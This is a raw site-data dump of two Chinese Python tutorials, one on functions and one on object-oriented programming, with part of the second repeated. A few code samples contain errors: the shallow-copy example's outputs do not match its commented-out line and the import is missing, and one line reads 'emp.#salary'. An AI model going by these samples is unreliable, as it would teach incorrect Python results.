函数是一个带名字的代码块，通过名称可以在其他位置调用代码块中的语句执行，很方便的实现代码的复用，并且在代码块中的代码修改时，函数调用执行也会执行新的代码，因此函数对于编程语言而言至关重要。函数包含函数调用、传参、返回值等内容。我们在这一篇中，一一整理出来。\n\n\n# 函数简介\n\n一个程序往往代表了完成某种任务的一系列操作的集合，而函数通常是完成这个任务全部方法或者拆分成某一项具体任务的功能步骤的集合。函数是代码复用的通常机制，通过函数极大方便了代码的复用。\n\n在python中的函数分为以下几种类型：\n\n 1. 内置函数\n    \n    例如我们之间使用过的str list len等，可以直接在代码中调用\n\n 2. 标准库函数\n    \n    我们通过import语句倒入了库，然后使用其中定义的函数\n\n 3. 第三方函数\n    \n    python社区提供了高质量的第三方库，安装这些库之后，通过import导入，就可以使用第三方的函数了\n\n 4. 用户自定义函数\n    \n    用户自定义的函数是开发中的主体，也是完成项目需求的重要组成，我们主要来看如何自定义用户函数。\n\n\n# 定义和调用\n\npython中定义一个函数的基本语法如下：\n\ndef 函数名称(参数列表):\n  函数体\n\n\n1\n2\n\n\npython中执行到def时，会创建一个函数的对象，并且绑定到函数的变量名称之上。括号内是函数的形式参数列表，可以没有参数，但是括号必须保留。如果函数体中有return语句，则可以执行return返回值，如果没有return，默认返回none。我们在调用函数之前，必须要先定义函数。内置的函数对象会自动创建，标准库中的和第三方库中的函数，在import时，也会执行模块中的def语句。\n\n\n# 函数形参和实参\n\n形参和实参可以简单理解为在定义函数时参数列表中的参数为形参，在实际调用传递给函数的参数为实参。\n\n\n# 文档字符串\n\n在程序中，我们通常使用井号编写一段注释，在函数中，通常在函数题开始的部分附上一段函数的定义说明，这就是文档字符串也称为函数注释，通常使用三个单引号或者双引号实现。之后可以通过print(函数名.__doc__)输出文档字符串：\n\ndef hello():\n    '''this is a hello world program...'''\n    print(\"helloworld\")\n\nprint(hello.__doc__) # this is a hello world program...\n\n\n1\n2\n3\n4\n5\n\n\n\n# 返回值\n\n如果函数体中包含了return语句，则会结束函数的执行并且返回返回值；\n\n如果函数体中不包含return语句，则默认返回none\n\n如果需哟啊返回多个值，则使用序列将其存起来，一起返回\n\n\n# 变量的作用域\n\n不同变量的作用范围不同，变量的作用范围称为变量的作用域，不同作用域内的同名变量不受影响。变量可以分为全局变量和局部变量：\n\n * 全局变量\n   * 在函数和类定义之外声明的变量，作用域是定义的模块，从定义开始到整个模块的结束\n   * 全局变量降低函数的通用性和可读性，避免使用全局变量\n   * 全局变量一般作为常量使用，函数内如果需要改变全局变量的值，则需要global声明\n * 局部变量\n   * 局部变量是在函数体中声明的变量\n   * 局部变量的引用要比全局变量快，因此优先使用局部变量\n   * 局部变量和全局变量同名，则优先shiyong 同名的局部变量，就近原则。\n\n\n# python中的参数传递\n\n函数的参数传递本质上就是将实际参数的值赋值给形参的过程。在python中，一切皆是对象，所有的赋值操作都是引用复制。因此python中的所有参数传递都是引用传递而不是值传递。因此对于可变对象的写操作会直接作用域原来的对象，对不可变对象的写操作，会产生一个新的对象，并填充新的值，是一种假的值传递。\n\n可变的对象有：字典、列表、集合、自定义的对象等\n\n不可变的对象：数字、字符串、元组、方法等。\n\n在传递可变对象时，如传递的是一个列表，则如果在函数中修改了形参的值，实际上实参的值也会改变。如果传递的是不可变的对象，因为参数的值不可变，则会复制一份出来，重新创建一个对象，就像其他语言中的值传递一样。\n\n例子：\n\ndef add1(n):\n    n -= 1\n\ndef add2(n):\n    n[0] -= 1\n\na = 1\nadd1(a)\nprint(a) # 1\n\na = list()\na.append(1)\nadd2(a)\nprint(a[0]) # 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果某个方法传递的是一个不可变对象作为参数，但是参数中包含了一个可变对象，则函数内修改可变对象也会影响函数外的参数的值。\n\n\n# 深拷贝和浅拷贝\n\n深拷贝会包括自对象一起拷贝，对子对象的修改不会影响原来的对象\n\n浅拷贝不会拷贝自对象的内容，只是拷贝了子对象的引用。\n\n在python中使用copy完成浅拷贝，使用deepcopy完成深拷贝\n\na = [1,2,3,[4,5,6]]\n\nb = copy.copy(a)\n# b[3][0] = 1\nprint(b) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [1, 5, 6]]\n\nc = copy.deepcopy(a)\nc[3][0] = 1\nprint(c) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [4, 5, 6]] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 参数的几种类型\n\n# 位置参数\n\n函数调用时，实际参数默认按照位置顺序传递，因此需要传递的形参个数和实际的参数匹配。按位置传递参数称为：位置参数。\n\n# 默认值参数\n\n在声明函数时，可以为参数设置默认值，这样这个参数就是可选的了，因此在没有传递值的时候就会使用默认值。但是默认参数要放在参数列表的最后面。\n\n# 命名参数\n\n我们也可以按照参数的名称传递参数，也称为关键字参数，这种传递参数的方式不需要位置的顺序。\n\n# 可变参数\n\n可变参数指的是在传递参数时，参数的数量可以发生变化。在java中使用string .. args表示可变参数。在python中使用*param一个星号，代表将多个参数放入到一个元组对象中去。**param表示将多个参数放入到一个字典中去。\n\n# 强制命名参数\n\n在可变参数后面命名的参数必须在调用的时候进行强制的命名。\n\ndef show1(a,b,c):\n    print(a,b,c)\n\nshow1(1,2,3) # 位置参数\n\ndef show2(a,b,c=10):\n    print(a,b,c)\n\nshow2(1,2) # 默认值参数\n\ndef show3(a,b,c):\n    print(a,b,c)\n\nshow3(c=1,a=2,b=3) # 命名参数\n\ndef show4(*a,**b):\n    print(type(a))\n    print(type(b))\n\nshow4(4,5,6,7,name='zhangsan',age=13) # 可变参数\n\ndef show5(*a,b,c,d):\n    print(type(a))\n\nshow5(1,2,3,4,b=2,c=3,d=4) # 强制命名参数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# lambda表达式和匿名参数\n\nlambda表达式可以用来声明一个匿名的函数，lambda函数是一个简单的在一行中定义函数的方法。lambda中只能包含一个表达式，而不能包含复杂的语句，该表达式计算的是函数的返回值。lambda的基本语法如下：\n\nlambda arg1,agr2,arg3 : 表达式\n\n\n1\n\n\n举例子：\n\nf = lambda a,b,c : a+b+c\nprint(f) # <function <lambda> at 0x7fadf00abd90>\nprint(f(1,2,3)) # 6\n\n\n1\n2\n3\n\n\n\n# eval函数\n\neval函数可以将字符串当成有效的表达式并计算结果。\n\n语法：\n\neval(source [,globals[,locals]]) -> value\n\n\n1\n\n\nsource: 一个python表达式或者函数compile返回的代码对象\n\nglobals：可选值，要求是一个dictionary\n\nlocals：可选值，映射的任意对象\n\na = 10\nb = 20\neval(\"print(a+b)\") # 30\n\n\n1\n2\n3\n\n\neval函数会讲字符串当作语句执行，因此非常的危险。\n\n\n# 递归\n\n递归大概就是指自己调用自己的一个过程。一个有效的递归函数要包含一个递归体和一个有效的终止条件，否则程序会一直递归调用，最终耗尽资源。\n\ndef factorial(n):\n    if n == 1: return 1\n    return n*factorial(n-1)\n\nfor i in range(1,6):\n    print(factorial(i))\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 嵌套函数\n\n是在函数内部定义的函数。\n\n嵌套函数在外部无法访问。\n\n\n# nonlocal关键字\n\nnonlocal 用于声明外层的局部变量\n\nglobal 用来声明全局变量\n\na = 10\ndef outer():\n    b = 20\n    def inner():\n        nonlocal b\n        print(b) # 20\n        b = 20\n        global a\n        a = 1000\n    inner()\n    print(b) # 20 \n\nouter()\nprint(a) # 1000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# legb规则\n\n在python中，如果是要查找某个变量时，按照legb的规则进行查找的：\n\nlocal --- enclosed --- global --- built in\n\n * local： 指的是函数或者方法的内部\n * enclosed ：指的是嵌套的函数\n * global：值得是模块中的全局变量\n * built in：python保留的名称\n\n如果每一个都没有找到，就会报错。nameerror",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python面向对象的那些事",frontmatter:{title:"Python面向对象的那些事",date:"2022-03-25T20:00:00.000Z",permalink:"/sec/dev/python/oop",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/04.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/04.Python面向对象的那些事.md",key:"v-40cc2fb1",path:"/sec/dev/python/oop/",headers:[{level:2,title:"面向对象简介",slug:"面向对象简介",normalizedTitle:"面向对象简介",charIndex:152},{level:2,title:"类",slug:"类",normalizedTitle:"类",charIndex:245},{level:3,title:"__init__构造方法和__new__方法",slug:"init-构造方法和-new-方法",normalizedTitle:"__init__构造方法和__new__方法",charIndex:876},{level:3,title:"实例属性和实例方法",slug:"实例属性和实例方法",normalizedTitle:"实例属性和实例方法",charIndex:1501},{level:3,title:"类对象、类属性、类方法、静态方法",slug:"类对象、类属性、类方法、静态方法",normalizedTitle:"类对象、类属性、类方法、静态方法",charIndex:2755},{level:3,title:"__del__方法和垃圾回收",slug:"del-方法和垃圾回收",normalizedTitle:"__del__方法和垃圾回收",charIndex:3759},{level:3,title:"__call__方法和可调用对象",slug:"call-方法和可调用对象",normalizedTitle:"__call__方法和可调用对象",charIndex:4171},{level:3,title:"方法重载",slug:"方法重载",normalizedTitle:"方法重载",charIndex:4369},{level:3,title:"方法的动态性",slug:"方法的动态性",normalizedTitle:"方法的动态性",charIndex:4686},{level:3,title:"私有属性和私有方法",slug:"私有属性和私有方法",normalizedTitle:"私有属性和私有方法",charIndex:5023},{level:3,title:"@property装饰器",slug:"property装饰器",normalizedTitle:"@property装饰器",charIndex:5662},{level:2,title:"面向对象的三大特征",slug:"面向对象的三大特征",normalizedTitle:"面向对象的三大特征",charIndex:6527},{level:3,title:"继承",slug:"继承",normalizedTitle:"继承",charIndex:208},{level:3,title:"多态",slug:"多态",normalizedTitle:"多态",charIndex:214}],headersStr:"面向对象简介 类 __init__构造方法和__new__方法 实例属性和实例方法 类对象、类属性、类方法、静态方法 __del__方法和垃圾回收 __call__方法和可调用对象 方法重载 方法的动态性 私有属性和私有方法 @property装饰器 面向对象的三大特征 继承 多态",content:"# Python面向对象的那些事\n\n> Python是一门支持面向对象的高级程序设计语言。面向对象和面向过程的程序设计语言不同，面向对象更像是搭积木，将一块一块现有的功能组合调用完成我们的任务。而面向过程需要我们去思考每一步应该怎么去做。这一篇我们一起来看看Python中的面向对象的相关知识。\n\n\n# 面向对象简介\n\nPython是一门完全采用了面向对象思想设计的高级语言，可以完全支持面向对象中的基本功能，比如：继承、封装、多态等。在Python中一切都是对象，包括我们前面提到过的数据类型、函数等。\n\n面向对象和面向过程不同的是：面向过程更加关注程序的执行流程和逻辑，面向过程更加关注的是软件对象之间的关系，是一种典型的设计者的思维。\n\n\n# 类\n\n类是什么？简单来说，类是一些具有相同特征事物的抽象，比如一堆饼干，类就是造饼干的磨具。\n\n我们通过类来定义数据类型的属性和方法，类可以将行为和状态放到一起。而对象就是一个类的实例，可以看作是饼干。一个类创建对象时，会共享类中定义的方法，但是不会共享类中的数据。\n\nPython中一切都是对象，因此类也是对象，类称为类对象，类的实例称为实例对象。\n\n怎么定义一个类？定义一个类有如下的几个要求：\n\n 1. 类名称要符合标识符的定义规则，首字母大写，使用驼峰命名原则\n 2. 类中可以定义属性和方法\n 3. 类中的属性用于描述数据，方法用于描述数据相关的一些操作。\n\nclass Student:\n    def __init__(self,name,score):\n        self.name = name\n        self.score = score\n\n    def say_score(self):\n        print(self.name,'分数是：',self.score)\n\n\ns1 = Student(\"zhangsan\",20)\ns1.say_score() # zhangsan 分数是： 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# __init__构造方法和__new__方法\n\n类是抽象的，类是对象的模版，我们可以通过类模版创建出类的实例对象，然后调用实例对象的相关功能。一个Python的对象包含如下的几个部分：\n\n 1. id identity识别码\n 2. type 对象的类型\n 3. value 对象的值\n    1. 属性 attribute\n    2. 方法 method\n\n在创建一个类时，我们需要定义一个构造方法，__init__，该方法类似于Java中的和类同名的方法，用于实例对象的初始化。在创建对象后，执行该方法，初始化对象的相关属性。\n\n__init__方法的相关要点：\n\n 1. 名称固定。\n 2. 第一个参数固定为self。self指的是刚刚创建的对象\n 3. 构造函数通常用来初始化实例对象的实例属性\n 4. 通过类名(形参列表)调用构造函数，调用完成之后，会将创建好的对象返回给相关的变量\n\n__init__方法和__new__方法的区别：\n\n * init方法用于初始化创建好的对象，初始化是指给对象的实例属性赋值\n * new方法用于创建对象，我们无需定义该方法\n * 如果不定义init方法，则和Java一样，默认会提供一个默认的无参数init方法，如果定义了带参数的init方法，则系统不创建默认的init方法\n\n在Python中，self相当于java中的this，self必须为构造函数的第一个参数，名字一般都是self。\n\n\n# 实例属性和实例方法\n\n# 实例属性\n\n实例属性是从属于实例对象的属性，也称为实例变量。实例属性一般在init方法中进行初始化，可以通过self.实例属性名访问实例属性，在创建实例对象之后，可以通过对象名.实例属性名。也可以新添加属性。\n\n# 实例方法\n\n实例方法是从属于实例对象的方法，实例方法定义时，第一个参数必须为self，后面的为形参列表。在调用实例方法时，不需要也不能给self传递参数，self由解释器自动传递参数。方法的定义格式如下所示：\n\ndef say_score(self,abc):\n  print(self.name,'分数是：',self.score)\n  print(abc)\n# 调用方式\n  s1 = Student(\"zhangsan\",20)\n  s1.say_score(123) # zhangsan 分数是： 20 123\n\n\n1\n2\n3\n4\n5\n6\n\n\n方法和函数有什么区别？\n\n * 方法和函数都是用来完成特定功能的代码块\n * 方法通过对象来调用，从属于一个实例对象，而函数不一样\n * 方法定义是需要传递self参数，函数不需要。\n\n一些常见的操作：\n\nclass Student:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n\n    def say_hello(self):\n        print(self.name,'hello')\n\n# 获取对象的所有属性和方法\ns = Student(\"zhangsan\",12)\nprint(dir(s)) # ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name', 'say_hello']\n\nprint(s.__dict__) # {'name': 'zhangsan', 'age': 12}\n\npass # 空语句\n\nprint(isinstance(s, Student)) # True  判断对象是不是为某种类型\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 类对象、类属性、类方法、静态方法\n\n# 类对象\n\nPython中一切都是对象，类也是，称为类对象，使用class关键字定义。\n\nclass Student:\n    pass\n\ns = Student()\nprint(type(Student)) # <class 'type'>\n\nprint(type(Student())) # <class '__main__.Student'>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 类属性\n\n类属性是从属于类对象的属性，也称为类变量，因为从属于类对象，因此可以被所有的实例对象共享。\n\n类属性的定义方式：\n\nclass Student:\n    name = \"zhansgan\"\n\nprint(Student.name) # zhansgan\n\n\n1\n2\n3\n4\n\n\n可以通过类名.类变量的方式访问。\n\n# 类方法\n\n类方法是从属于类对象的方法，使用@classmethod定义。第一个cls参数必须要传递，代表的是类对象的本身。调用类方法的方式是：类名.类方法名(参数列表)。参数列表中，不需要传递cls值。类方法中访问实例属性和实例方法导致错误，子类继承父类方法时，传入cls时子类对象，而并非是类对象。\n\nclass Student:\n    company = \"hello\"\n\n    @classmethod\n    def printConpany(cls):\n        print(cls.company)\n\nStudent.printConpany() # hello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 静态方法\n\nPython中允许定义和类对象无关的方法，称为静态方法。静态方法和普通函数没有区别，只不过静态方法放到了类的名字空间里面，需要通过类来调用。静态方法的调用格式为：类名.静态方法名(参数列表)。静态方法中访问实例属性和实例方法会报错。\n\nclass Student:\n    company = \"xxx\"\n\n    @staticmethod\n    def add(a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n        return a+b\n\nStudent.add(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# __del__方法和垃圾回收\n\n__del__方法称为析构方法，用于实现对象销毁时所需要的操作。比如释放对象资源等等。Python可以实现自动的垃圾回收机制，当对象没有被引用时，由垃圾回收器调用__del——_方法。我们可以使用del删除对象，调用__del__方法。\n\nclass Person:\n    def __del__(self):\n        print(\"销毁对象：{0}\".format(self))\n\np1 = Person()\np2 = Person()\ndel p2\nprint(\"----\")\n\n\"\"\"\n销毁对象：<__main__.Person object at 0x7fd23000b5e0>\n----\n销毁对象：<__main__.Person object at 0x7fd23000be80>\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# __call__方法和可调用对象\n\n实现了__call__方法的对象称为可调用对象，即该对象可以被像函数一样调用。\n\nclass CalcUtil:\n    def __call__(self,a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n\ns = CalcUtil()\ns(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 方法重载\n\n在Python中方法没有重载，其他语言中，可以定义多个同名的方法，只要保证方法的签名唯一即可。方法的签名包含方法名，参数数量和参数类型。\n\nPython中，方法的参数没有声明参数类型，参数的数量也可以由可变参数控制。因此Python中不存在方法重载。如果在类中定义了多个同名方法，只有最后一个方法是有效的。\n\nclass Person:\n    def say(self):\n        print(\"hello1\")\n    def say(self):\n        print(\"hello2\")\n\np1 = Person()\np1.say() # hello2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 方法的动态性\n\nPython是一种动态语言，我们可以给类添加新的方法，或者动态的修改类现有的一些方法。\n\nclass Person:\n    def work(self):\n        print(\"shangban\")\n\ndef play(self):\n        print(\"play\")\n\ndef work2(self):\n    print(\"work2\")\n\nPerson.play_game = play\nPerson.work = work2\n\np = Person()\n\nprint(dir(p))\n\np.play_game() # play\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 私有属性和私有方法\n\nPython对于类的成员没有严格访问的控制限制，这和其他的面向独享的语言有所区别。通常情况下我们约定两个下划线开头的属性是私有属性，其他的为公共的。类内部可以访问私有属性，类外部不能直接访问私有的属性。类外部可以通过_类名__私有属性名访问私有属性或者方法。\n\nclass Employee:\n    __company = \"aaa\"\n\n    def __init__(self,name,age):\n        self.name = name\n        self.__age = age\n    def say_company(self):\n        print(\"我的公司是：\",Employee.__company) # 我的公司是： aaa\n        print(self.name,\"的年龄是\",self.__age) # zhangsan 的年龄是 12\n        self.__work()\n\n    def __work(self):\n        print(\"work\") # work\n\ne1 = Employee(\"zhangsan\",12)\nprint(e1.name)  # zhangsan\nprint(e1._Employee__age) # 12\ne1.say_company()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# @property装饰器\n\n@property可以将一个方法的调用变为对属性的调用。\n\nclass Employee:\n\n    @property\n    def salary(self):\n        return 2000\n\nemp = Employee()\nprint(emp.salary) # 2000\nprint(type(emp.salary)) # <class 'int'>\n\n# emp.salary() # TypeError: 'int' object is not callable\n\nemp.#salary = 200 # AttributeError: can't set attribute 'salary'\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n@property用于帮助我们处理属性的读写操作，对于属性我们可以直接赋值的方式读写，但是对于一些数据，有一些范围的限制，必须通过setget方法来进行写入和读取。\n\nclass Employee:\n\n    def __init__(self):\n        self.__salary = 0\n\n    @property\n    def salary(self):\n        return self.__salary\n\n    @salary.setter\n    def salary(self,salary):\n        if(0<salary<1000):\n            self.__salary = salary\n        else:\n            print(\"数据异常\")\n\nemp = Employee()\nprint(emp.salary)\nemp.salary = 200\nprint(emp.salary) # 200\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 面向对象的三大特征\n\nPython是面向对象的语言，支持面向对象的三大特征，分别是封装继承和多态。\n\n * 封装是隐藏对象的属性和实现的具体细节，只对外提供必要的方法，相当于将细节封装起来，只对外暴露相关的调用方法。\n * 继承可以让子类具有父类的特性，可以提高代码的重用性\n * 多态指的是同一个方法调用因为不同的对象会产生不同的行为。\n\n\n# 继承\n\n继承是面向对象的一个重要特性，也是实现代码复用的重要的手段。Python中可以实现多重继承，一个子类可以继承多个父类，如果在类定义中没有指定父类，则默认是继承Object类，Objec类是所有的类的父类。定义子类时必须在构造函数中调用父类的构造函数，调用方式如下：父类名.__init___(self,参数列表)\n\n示例代码：\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\ns1 = Student(\"zhangsan\",12,1,100)\ns1.say_hello() # hello, zhangsan\nprint(dir(s1))\nprint(s1.name) # zhangsan\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 类成员的继承和重写\n\n 1. 成员继承，子类可以继承父类除了构造方法以外的所有成员。\n 2. 方法重写，子类可以重新定义父类中的方法，覆盖掉原本的父类方法，称为重写。\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\ns1 = Student(\"zhangsan\",12,1,100)\ns1.say_hello() # i am a student\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 查看类的层次结构\n\n可以通过类方法mro() 或者类属性__mro__输出类的层次结构\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\nprint(Student.mro()) # [<class '__main__.Student'>, <class '__main__.Person'>, <class 'object'>]\n\nprint(Student.__mro__) # (<class '__main__.Student'>, <class '__main__.Person'>, <class 'object'>)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# Object类\n\nobject类是所有类的父类，object中的方法在每个类中都存在。\n\n可以通过dir()来查看对象的属性，我们可以通过dir函数，产看置顶对象中的所有属性。\n\n在object中有一个__str__()方法，该方法用于返回一个对象的信息。类似于java中的toString方法。\n\nclass Person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n\np = Person()\nprint(p) # i am a person\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 多重继承\n\n和Java不一样，Python是支持多重继承的，因此一个子类可以有多个直接的父类。但是这样的继承方式往往太复杂，应该尽量的避免使用。\n\n# mro()\n\npython中支持多重继承，如果父类中有相同名字的方法，在子类中没有指定父类名时，默认按照从做向右的顺序搜索。MRO(Method Resolution Order)：方法的解析顺序。\n\n# super() 获得父类定义\n\n在子类中，如果想要获得某个父类的方法时，我们可以通过super来调用，super代表的是父类的定义，而不是父类的对象。\n\nclass Person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n    def say(self):\n        print(\"say\")\n\nclass Student(Person):\n    def say(self):\n        print(\"student\")\n        super().say()\n\ns1 = Student()\ns1.say()  # student say\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 多态\n\n多态指的是同一个方法因为不通的对象调用所产生的不同的行为。多态是方法的多态，对于属性并没有多态，多态有两个重要的条件，一个是继承，一个是方法的重写。\n\nclass Animal:\n    def shout(self):\n        print(\"animal shout\")\n\nclass Dog(Animal):\n    def shout(self):\n        print(\"wang wang\")\n\nclass Cat(Animal):\n    def shout(self):\n        print(\"miaomiao\")\n\ndef animalShot(a):\n    if isinstance(a,Animal):\n        a.shout()\n\nanimalShot(Cat()) # miaomiao\nanimalShot(Dog()) # wang wang \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 特殊方法和运算符重载\n\nPython中的运算符实际上都是通过调用对象的特殊方法实现的。\n\na = 10\nb = 20\nc = a+b\nd = a.__add__(b)\nprint(c) # 30\nprint(d) # 30\n\n\n1\n2\n3\n4\n5\n6\n\n\nPython一些特殊的方法：\n\n方法                 说明      例子\n__init__           构造方法    对象创建：p = Person()\n__del__            析构方法    对象回收\n__repr__,__str__   打印，转换   print(a)\n__call__           函数调用    a()\n__getattr__        点号运算    a.xxx\n__setattr__        属性赋值    a.xxx = value\n__getitem__        索引运算    a[key]\n__setitem__        索引赋值    a[key]=value\n__len__            长度      len(a)\n\n运算符所对应的特殊的方法如下：\n\n运算符        特殊方法                                       说明\n运算符+       __add__                                    加法\n运算符-       __sub__                                    减法\n<,<=,==    __lt__,__le__，__eq__                       比较运算符\n>,>=,!=    __gt__,__ge__,__ne__                       \n|,^,&      __or__,__xor__,__and__                     或、异或、与\n<<,>>      __lshift__,__rshift__                      左移、右移\n*,/,%,//   __mul__,__truediv__,__mod__,__floordiv__   乘、浮点除、模运算 （取余）、整数除\n**         __pow__                                    指数运算\n\n我们可以重写以上的方法实现方法的重载：\n\nclass Person:\n    def __init__(self,name):\n        self.name = name\n\n    def __add__(self, other):\n        if isinstance(other,Person):\n            return \"{0} -- {1} \".format(self.name,other.name)\n        else:\n            return \"error\"\n\ns1 = Person(\"zhangsan\")\ns2 = Person(\"lisi\")\nprint(s1 + s2) # zhangsan -- lisi \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 特殊的属性\n\nPython中对象包含了很多以下划线开始和结束的属性，这些特殊属性常见的如下：\n\n特殊方法                     含义\nobj.__dict__             对象的属性字典\nobj.__class__            对象所属的类\nclass.__bases__          类的基类元组（多继承）\nclass.__base__           类的基类\nclass.__mro__            类层次结构\nclass.__subclasses__()   子类列表\n\n# 对象的深浅拷贝\n\n在上面我们其实已经提到对象的深浅拷贝的问题，浅拷贝时对象包含的子对象不会被拷贝，深拷贝则拷贝子对象。python中使用copy.copy()实现浅拷贝，使用copy.deepcopy()实现深拷贝。",normalizedContent:"# python面向对象的那些事\n\n> python是一门支持面向对象的高级程序设计语言。面向对象和面向过程的程序设计语言不同，面向对象更像是搭积木，将一块一块现有的功能组合调用完成我们的任务。而面向过程需要我们去思考每一步应该怎么去做。这一篇我们一起来看看python中的面向对象的相关知识。\n\n\n# 面向对象简介\n\npython是一门完全采用了面向对象思想设计的高级语言，可以完全支持面向对象中的基本功能，比如：继承、封装、多态等。在python中一切都是对象，包括我们前面提到过的数据类型、函数等。\n\n面向对象和面向过程不同的是：面向过程更加关注程序的执行流程和逻辑，面向过程更加关注的是软件对象之间的关系，是一种典型的设计者的思维。\n\n\n# 类\n\n类是什么？简单来说，类是一些具有相同特征事物的抽象，比如一堆饼干，类就是造饼干的磨具。\n\n我们通过类来定义数据类型的属性和方法，类可以将行为和状态放到一起。而对象就是一个类的实例，可以看作是饼干。一个类创建对象时，会共享类中定义的方法，但是不会共享类中的数据。\n\npython中一切都是对象，因此类也是对象，类称为类对象，类的实例称为实例对象。\n\n怎么定义一个类？定义一个类有如下的几个要求：\n\n 1. 类名称要符合标识符的定义规则，首字母大写，使用驼峰命名原则\n 2. 类中可以定义属性和方法\n 3. 类中的属性用于描述数据，方法用于描述数据相关的一些操作。\n\nclass student:\n    def __init__(self,name,score):\n        self.name = name\n        self.score = score\n\n    def say_score(self):\n        print(self.name,'分数是：',self.score)\n\n\ns1 = student(\"zhangsan\",20)\ns1.say_score() # zhangsan 分数是： 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# __init__构造方法和__new__方法\n\n类是抽象的，类是对象的模版，我们可以通过类模版创建出类的实例对象，然后调用实例对象的相关功能。一个python的对象包含如下的几个部分：\n\n 1. id identity识别码\n 2. type 对象的类型\n 3. value 对象的值\n    1. 属性 attribute\n    2. 方法 method\n\n在创建一个类时，我们需要定义一个构造方法，__init__，该方法类似于java中的和类同名的方法，用于实例对象的初始化。在创建对象后，执行该方法，初始化对象的相关属性。\n\n__init__方法的相关要点：\n\n 1. 名称固定。\n 2. 第一个参数固定为self。self指的是刚刚创建的对象\n 3. 构造函数通常用来初始化实例对象的实例属性\n 4. 通过类名(形参列表)调用构造函数，调用完成之后，会将创建好的对象返回给相关的变量\n\n__init__方法和__new__方法的区别：\n\n * init方法用于初始化创建好的对象，初始化是指给对象的实例属性赋值\n * new方法用于创建对象，我们无需定义该方法\n * 如果不定义init方法，则和java一样，默认会提供一个默认的无参数init方法，如果定义了带参数的init方法，则系统不创建默认的init方法\n\n在python中，self相当于java中的this，self必须为构造函数的第一个参数，名字一般都是self。\n\n\n# 实例属性和实例方法\n\n# 